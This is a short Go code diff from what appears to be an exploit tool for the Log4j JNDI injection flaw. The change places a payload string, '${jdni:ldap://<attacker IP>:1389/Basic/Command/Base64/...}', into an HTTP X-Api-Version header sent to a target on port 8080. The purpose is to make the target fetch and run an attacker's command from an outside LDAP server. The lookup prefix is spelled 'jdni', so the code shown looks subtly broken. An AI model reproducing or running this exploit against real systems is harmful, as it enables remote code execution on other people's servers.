@@ -179,7 +179,7 @@ func SendPayload(payload string, targetip string) (string, error) {
 	target := targetip + ":8080"
 	reqPayload := "${jdni:ldap://" + intIP.String() + ":1389/Basic/Command/Base64/" + payload + "}"
 	req, err := http.NewRequest("GET", "http://"+target+"/", nil)
-	req.Header.Add("X-Api-Version", "")
+	req.Header.Add("X-Api-Version", reqPayload)
 	if err != nil {
 		return "", err
 	}
